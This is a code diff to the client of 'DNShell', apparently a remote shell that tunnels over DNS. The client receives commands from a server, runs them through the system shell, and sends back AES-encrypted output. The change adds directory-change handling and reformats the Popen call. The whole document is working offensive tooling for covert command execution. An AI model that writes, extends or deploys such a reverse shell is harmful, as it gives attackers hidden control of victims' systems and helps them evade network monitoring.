@@ -1,3 +1,4 @@
+#!/usr/local/Cellar/python/2.7.4/bin/python2.7
 #!/usr/bin/env python
 # DNShell Client v1.3
 
@@ -5,6 +6,7 @@ from Crypto.Cipher import AES
 import subprocess, os
 import dns.resolver
 import textwrap, base64
+import re
  
 HOST = '127.0.0.1'
 PORT = 53
@@ -79,9 +81,20 @@ def runCmd(cmd):
  
   # Check for server quit command
   if nxtCmd == "quit": exit(0)
+
   # Execute server command
-  proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+  proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE,
+                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   stdoutput = proc.stdout.read() + proc.stderr.read()
+
+  # Handle Directory Changes:
+  if re.match('^cd .*', nxtCmd):
+    try:
+      directory = nxtCmd.split('cd ')[-1]
+      os.chdir(directory)
+      stdoutput = '{}'.format(os.getcwd())
+    except:
+      stdoutput = 'Couldn\'t change directory to: {}'.format(directory)
  
   # Encrypt output
   eStdoutput = encrypt(stdoutput)
